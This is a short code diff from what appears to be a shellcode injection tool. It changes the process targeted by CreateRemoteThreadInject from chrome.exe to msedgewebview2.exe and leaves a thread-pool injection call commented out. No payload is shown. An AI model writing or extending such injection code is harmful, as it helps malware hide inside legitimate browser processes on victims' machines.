@@ -20,6 +20,6 @@ int main() {
 	}
 
 	//RemoteTpJobInsertion(lpShellcode, dwShellcodeSize);
-	wchar_t wsName[] = L"chrome.exe";
+	wchar_t wsName[] = L"msedgewebview2.exe";
 	CreateRemoteThreadInject(lpShellcode, dwShellcodeSize, wsName);
 }
